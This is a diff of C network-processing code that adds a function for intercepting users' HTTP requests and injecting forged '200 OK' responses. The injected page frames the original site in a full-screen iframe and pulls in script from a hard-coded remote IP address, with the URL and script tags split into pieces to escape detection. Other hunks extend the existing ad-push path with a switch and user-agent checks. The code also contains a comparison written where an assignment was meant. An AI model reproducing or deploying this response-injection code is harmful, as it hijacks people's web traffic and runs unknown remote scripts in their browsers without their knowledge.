@@ -128,6 +128,130 @@ static inline struct rte_mbuf *rte_pktmbuf_real_clone(struct rte_mbuf *md,
   return (mc);
 }
 
+
+
+berr naga_adp_new(hytag_t *hytag)
+{
+	int l =0;
+	uint8_t bufferp[2048];
+	uint8_t *buffer = bufferp;
+	
+    if(( NULL == hytag) /*|| (NULL == hytag->m)*/)
+    {
+        CNT_INC(ADP_DROP_PARAM);
+        BRET(E_PARAM);
+    }
+
+    /* */
+    if( APP_TYPE_HTTP_GET_OR_POST != hytag->app_type)
+    {
+        CNT_INC(ADP_DROP_GET_OR_POST);
+        return E_SUCCESS;
+    }
+
+
+	if(ACT_DROP == (hytag->acl.actions & ACT_DROP))
+	{
+       	CNT_INC(ADP_DROP_ACT_DROP);
+        return E_SUCCESS;
+	}
+    
+	if(0 == (hytag->acl.actions & ACT_PUSH))
+	{
+       	CNT_INC(ADP_DROP_ACT_PUSH);
+        return E_SUCCESS;
+	}
+
+    if (likely(!g_adp_push_switch))
+    {
+        return E_SUCCESS;
+    }    
+
+	if(hytag->url_append == DISABLE)
+	{
+    	if(hytag->uri[0] == '/' && hytag->host_len > 0 && hytag->uri_len > 0)
+    	{
+        	hytag->url_len= snprintf(hytag->url, URL_MAX_LEN, "%s%s",
+                                                hytag->host, hytag->uri);
+			hytag->url_append == ENABLE;
+    	}
+	}
+
+
+
+	memcpy((void*)buffer, hytag->pbuf.ptr, hytag->l5_offset);//copy l2-l4 len
+	char head[]="HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
+		"Content-Length:"; 
+	char tail[] = "\r\n"
+		"Cache-Control: no-store, no-cache\r\n"
+		"Connection: close\r\n\r\n";
+
+
+	
+	char body1[] = "<html>\n"
+            "<head>\n"
+            "<meta charset=\"utf-8\">\n"
+            "<title></title>\n"
+			"<script type=\"text/javascript\" src=\"http://cdn.staticfile.org/jquery/1.7/jquery.min.js\"></script>\n"
+			"<script>\n"
+            "d=document;\n"
+            "function u(){\n"
+            "var f = \"";
+            
+		
+	char body2[] = "\";\n"
+            "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_t=t\';\n"
+            "}\n"
+            "</script>\n"
+            "<style>\n"
+            "body{margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
+            "#i{display:block;position:absolute;z-index:1;width:100%;height:100%}\n"
+            "</style>\n"
+            "</head>\n"
+            "<body>\n"
+            "<div id=i>\n"
+            "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
+            "</div>\n"
+            "<script>"
+            "var usrc='ht'+'tp'+':/'+ '/'+'219'+'.234'+'.83.60'+'/ad/ad.php';"
+            "document.write('<scr'+'ipt type=\"text/javascript\"'+' src=\"'+usrc+'\"></scr'+'ipt>');"
+			"</script>\n"			
+			"<script>"
+			"$(function(){u();});"	
+			"</script>\n"	
+			"</body>\n"
+            "</html>\n";
+            
+
+
+	char * buffer_l5 = (char *)(buffer+ hytag->l5_offset);
+	int contlen = sizeof(body1) + sizeof(body2) + hytag->url_len;
+	l = snprintf(buffer_l5, 2048, "%s%d%s%shttp://%s%s",
+		head, contlen, tail, body1, hytag->url,  body2);
+
+	hytag->l5_len = l;
+
+	int rv;
+	rv = ads_response_packet_gen(buffer, hytag);
+	 
+
+    rv = ift_raw_send_packet(hytag->fp, buffer, (int)hytag->data_len);
+
+	 //printf("datalen = %d\n", hytag->data_len);
+	 //printf("string = %s\n",  buffer_l5);
+     if(rv != E_SUCCESS)
+     {
+          printf("Send packet Failed\n");
+          return rv;
+     }	
+	 
+	 return E_SUCCESS;		
+}
+
+
+
+
+
 berr naga_adp(hytag_t *hytag)
 {
 
@@ -163,6 +287,10 @@ berr naga_adp(hytag_t *hytag)
        	CNT_INC(ADP_DROP_ACT_PUSH);
         return E_SUCCESS;
 	}
+    if (likely(!g_adp_push_switch))
+    {
+        return E_SUCCESS;
+    }    
 
 
 
@@ -210,19 +338,19 @@ berr naga_adp(hytag_t *hytag)
 
 
 
-
+#if 1
     /*check The First char*/
 	if(hytag->uri[0] == '/' && hytag->host_len > 0 && hytag->uri_len > 0)
 	{
 		hytag->url_len= snprintf(hytag->url, URL_MAX_LEN, "http://%s%s",
                                                 hytag->host, hytag->uri);
 	}
-
+#endif
 
     txm = hytag->m;
 
 
-
+	
     if( strstr(hytag->user_agent, "Phone") 
         || strstr(hytag->user_agent, "Android")
         //|| strstr(hytag->user_agent, "BlackBerry")
@@ -242,6 +370,7 @@ berr naga_adp(hytag_t *hytag)
         }
         
     }
+	
     else if(
         strstr(hytag->user_agent, "MSIE")
        || strstr(hytag->user_agent, "Windows")
@@ -280,8 +409,6 @@ berr naga_adp(hytag_t *hytag)
         CNT_INC(ADP_DROP_ADP_INTERVAL);
         return E_SUCCESS;
     }
-
-
 
 	
 	CYCLE_INIT(1);
@@ -325,9 +452,11 @@ berr naga_adp(hytag_t *hytag)
 
     }
         
-         
+
+      
     if( adt_send_is_multi())
     {
+    
 #if USE_D_PACKET
 #define CONTENT_FILL_LEN_MAX 1400
             hytag->content_offset = 0;
